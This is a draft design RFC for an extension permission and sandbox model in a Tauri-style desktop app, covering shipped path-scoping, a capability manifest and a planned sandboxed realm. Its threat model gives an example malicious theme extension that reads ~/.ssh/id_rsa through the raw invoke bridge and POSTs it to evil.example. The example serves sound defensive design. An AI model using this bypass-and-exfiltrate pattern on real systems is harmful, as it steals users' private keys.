---
status: draft
created: 2026-06-04
---

# 0006. Extension permissions + sandbox model

## Summary

A declared-capability permission model and a sandbox plan for untrusted
(third-party / remote-installed) extensions, so loaded code does not run with the
full `ctx` in the host realm by default.

## Motivation

Loaded extensions currently run with the **full `ctx`** (filesystem, process spawn,
everything) in the host realm — fine for trusted first-party
([ADR 0015](../decisions/0015-phased-security-model.md) phase 1), but
remote install from GitHub/npm ([RFC 0008](./0008-extension-package-format-remote-install.md))
is unreviewed code behind a single confirm dialog. A permission/sandbox model is
the gate for a public marketplace.

## Threat model — what the earlier phases do NOT stop

The phase-2 controls (workspace path-scoping, capability manifest) are enforced
**in JavaScript, inside the host realm the extension shares**. They constrain the
`ctx` surface — but `ctx` is not the only path to privilege. An extension runs in
the same realm and over the same Tauri IPC bridge as the host, so it can reach the
raw privileged command **beside** the wrapper that guards it:

```ts
// package.json declares NO permissions; installs as "a theme", no prompt.
import { invoke } from "@tauri-apps/api/core"; // or window.__TAURI_INTERNALS__.invoke

export const extension = {
  id: "sunset.theme",
  async activate() {
    // ctx.files.readText("~/.ssh/id_rsa") → PathDeniedError. So skip ctx:
    // call the exact command the host itself calls, with any path.
    const key = await invoke("fs_read_text", { path: "/Users/me/.ssh/id_rsa" });
    await fetch("https://evil.example/x", { method: "POST", body: key }); // network ungated in-realm
  },
};
```

Why each gate misses it:

- **Path-scoping is a property of the `ctx.files` object, not of `invoke`.** The
  raw `invoke` (and the host's own unscoped `fs_*` callers) sit in the same realm.
- **The platform-ban lint never runs on third-party code** — it lints first-party
  _source_; a remote extension ships a pre-built bundle. The Tauri bridge is on
  `window` regardless of the bare import.
- **The capability manifest is advisory** — it drives a consent dialog; nothing
  in-realm enforces it. `fetch` / `WebSocket` / dynamic `import()` of a remote URL
  / an `<img>` beacon are all ungated.
- **Same realm = more than files** — the extension can monkeypatch host functions,
  read/mutate the valtio `store`, scrape `localStorage`/IndexedDB, and reach other
  extensions' state. The file read is just the cleanest illustration.

**Conclusion:** phases 1–2 are **honest-mistake containment + consent + audit**,
not a wall against hostile code. Only **sandboxed execution** — the extension in a
separate realm with no direct IPC, every host call brokered through a `ctx` proxy
that enforces the manifest — turns the declared capabilities into real
enforcement. Nothing should imply the install-time permission prompt is a security
guarantee until that lands; the user-facing rule stays _install extensions you
trust_.

## Design

Builds out the later phases of [ADR 0015](../decisions/0015-phased-security-model.md):

1. ✅ **Workspace path-scoping** on `files`/`process` — **shipped**. A third-party
   extension's `ctx.files`/`ctx.process` resolve inside the open workspace;
   out-of-scope access throws `PathDeniedError`
   (`packages/extension-host/src/extension-host/security/resolve-path.ts`, the
   scoped service wrappers, and per-extension trust/scope in `createContext`).
2. ✅ **Capability manifest** — **shipped**. An extension declares its
   `fs:read`/`fs:write`/`process`/`network` needs in `silo.permissions`; install
   surfaces them for **consent** (a dedicated modal) and persists the granted set,
   enforced at the `ctx` chokepoint. `network` is consent-only in-process.
3. 🔴 **Sandboxed execution** — run untrusted code in a worker/iframe realm with a
   brokered `ctx`. **Not started** — the only phase that makes the manifest a true
   boundary (see the threat model above), and the gate for a public marketplace.
4. 🔴 **Integrity** — signing / checksums on remote tarballs. Pairs with
   [RFC 0008](./0008-extension-package-format-remote-install.md).

## Alternatives considered

- **Stay trust-based** (ADR 0015 phase 1) — acceptable for first-party only;
  unacceptable once arbitrary remote code can install.

## Decision

Phases 1–2 (workspace path-scoping + capability manifest with install consent)
are **implemented**; phases 3–4 (sandbox + integrity) remain and are gated to when
remote install / a marketplace is real. The RFC stays open until the sandbox —
the phase that turns declared capabilities into enforcement — lands.

## References

- [ADR 0015](../decisions/0015-phased-security-model.md),
  [ADR 0019](../decisions/0019-runtime-extension-loading.md),
  [RFC 0008](./0008-extension-package-format-remote-install.md).
